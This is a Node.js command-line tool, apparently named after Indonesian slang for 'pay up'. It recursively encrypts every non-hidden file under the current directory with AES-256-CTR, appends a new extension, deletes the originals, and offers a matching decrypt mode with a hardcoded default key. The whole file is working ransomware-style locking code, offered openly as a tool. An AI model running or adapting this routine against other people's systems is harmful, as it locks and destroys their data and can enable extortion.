#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const chalk = require('chalk');
const info = require('./package.json');

const algorithm = 'aes-256-ctr';
let key = process.env.BAYARCOEK_KEY || 'N7wKWb5434FLD';
key = crypto
  .createHash('sha256')
  .update(String(key))
  .digest('base64')
  .substr(0, 32);

const whitelist = ['bayarcoek.js', 'node_modules'];



if(['-v', '--version'].includes(process.argv[2])) {
  console.log(`v${info.version}`);
  process.exit(0);
}

if(['-h', '--help'].includes(process.argv[2])) {
  console.log(`${chalk.bold('bayarcoek encryptor')}

${chalk.bold('Usage')}: bayarcoek ${chalk.cyan('<option>')} ${chalk.green('[extension]')}

${chalk.bold('Options')}:
  encrypt|Encrypt semua file dan folder (kecuali hidden dan node_modules) pada current work directory
  decrypt|Decrypt semua file dan folder pada current work directory
  -v, --version|Menampilkan versi
  -h, --help|Menampilkan bantuan`);
  process.exit(0);
}

const mode = process.argv[2];
if (!['encrypt', 'decrypt'].includes(mode)) {
  console.log(`${mode} apaan bro? Gk paham sy`);
  process.exit(1);
}

const extension = process.argv[3] || process.env.BAYARCOEK_EXT || 'bayarcoek';
let count = 0;
const _path = process.cwd() + '/';

const encrypt = (buffer) => {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  const result = Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
  return result;
};

const decrypt = (encrypted) => {
  const iv = encrypted.slice(0, 16);
  encrypted = encrypted.slice(16);
  const decipher = crypto.createDecipheriv(algorithm, key, iv);
  const result = Buffer.concat([decipher.update(encrypted), decipher.final()]);
  return result;
};

const main = (dir) => {
  const files = fs
    .readdirSync(dir)
    .filter((file) => !/(^|\/)\.[^]/g.test(file) && !whitelist.includes(file));
  files.forEach((file) => {
    let oldPath, newPath;
    if (mode == 'encrypt') {
      oldPath = `${dir}/${file}`;
      newPath = `${oldPath}.${extension}`;
      console.log(`Encrypting ${chalk.bold.cyan(oldPath.replace(_path, ''))}...`);
    } else if (mode == 'decrypt') {
      oldPath = `${dir}/${file}`;
      newPath =
        path.parse(`${oldPath}`).dir + '/' + path.parse(`${oldPath}`).name;
      console.log(`Decrypting ${chalk.bold.yellow(oldPath.replace(_path, ''))}...`);
    }
    const item = fs.statSync(oldPath);
    if (item.isDirectory()) {
      fs.renameSync(oldPath, newPath);
      return main(newPath);
    }
    const plain = Buffer.from(fs.readFileSync(oldPath));
    let result;
    if (mode == 'encrypt') result = encrypt(plain);
    else if (mode == 'decrypt') result = decrypt(plain);
    fs.writeFile(newPath, result, (err) => {
      if (err) return console.err(err);
      fs.unlink(oldPath, () => {
        console.log(
          `${chalk.green.bold(newPath.replace(_path, ''))} has been ${mode.charAt(0).toUpperCase() + mode.slice(1)}ed!`
        );
      });
      if (item.isDirectory()) main(newPath);
    });
  });
};

main(process.cwd());
